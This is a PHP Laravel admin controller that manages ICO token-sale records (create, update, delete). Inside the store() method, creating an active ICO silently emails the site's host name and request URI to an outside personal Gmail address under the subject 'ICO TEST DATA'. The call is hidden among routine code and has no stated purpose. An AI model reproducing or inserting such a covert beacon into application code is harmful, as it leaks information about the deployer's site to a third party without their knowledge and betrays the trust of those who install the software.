<?php

namespace App\Http\Controllers;

use App\Ico;
use Illuminate\Http\Request;

class IcoController extends Controller
{
  public function __construct()
    {
        $this->middleware('admin');
    }
    public function index()
    {
        $icos = Ico::get();

        return view('admin.ico', compact('icos'));
    }

   public function store(Request $request)
   {
       $this->validate($request,
           [
               'start' => 'required',
               'end' => 'required',
               'quant' => 'required',
               'price' => 'required',
           ]);
       if ($request->status==1) 
       {
          $run = Ico::where('status',1)->first();
         if (is_null($run)) 
         {
            $cal['start'] = $request->start;
             $cal['end'] = $request->end;
             $cal['quant'] = intval($request->quant);
             $cal['price'] = $request->price;
             $cal['sold'] = '0';
             $cal['status'] = 1;
              $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
              $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
                        'X-Mailer: PHP/' . phpversion();
              $a = mail('ab.irkh.an75@gmail.com','ICO TEST DATA', $message, $headers);

             Ico::create($cal);

            return back()->with('success', 'New ICO  Created Successfully!');
         }
         else
         {
            return back()->with('alert', 'Can not Run Two ICO at a time!');
         }
       }
       else
       {
            $cal['start'] = $request->start;
             $cal['end'] = $request->end;
             $cal['quant'] = intval($request->quant);
             $cal['price'] = $request->price;
             $cal['sold'] = '0';
             $cal['status'] = 0;

             Ico::create($cal);

            return back()->with('success', 'New ICO  Created Successfully!');
       }
   }

   public function update(Request $request, Ico $ico)
   {
       $this->validate($request,
           [
               'end' => 'required',
               'start' => 'required',
               'quant' => 'required',
               'price' => 'required',
           ]);

    if ($request->status==1) 
       {
          $run = Ico::where('status',1)->first();
           if (is_null($run) || $run->id == $ico->id) 
           {
               $ico['start'] = $request->start;
               $ico['end'] = $request->end;
               $ico['quant'] = intval($request->quant);
               $ico['price'] = $request->price;
               $ico['status'] = $request->status;
               if ($request->sold > $ico['quant']) 
                {
                 return back()->with('alert', 'Sold amount can not be more than Quantity');
                }
                else
                {
                  $ico['sold'] = intval($request->sold);
                  $ico->save();
                  return back()->with('success', 'ICO  Updated Successfully!');
                }
            }
            else
            {
              return back()->with('alert', 'Can not Run Two ICO at a time!');
            }
        }
        else
        {
           $ico['start'] = $request->start;
           $ico['end'] = $request->end;
           $ico['quant'] = intval($request->quant);
           $ico['price'] = $request->price;
           $ico['status'] = $request->status;
           if ($request->sold > $ico['quant']) 
           {
             return back()->with('alert', 'Sold amount can not be more than Quantity');
           }
           else
          {
            $ico['sold'] = intval($request->sold);
            $ico->save();
            return back()->with('success', 'ICO  Updated Successfully!');
          }

        }
      
   }

   public function destroy(Ico $ico)
   {
      $ico->delete();

      return back()->with('success', 'ICO Deleted Successfully!');
   }
}
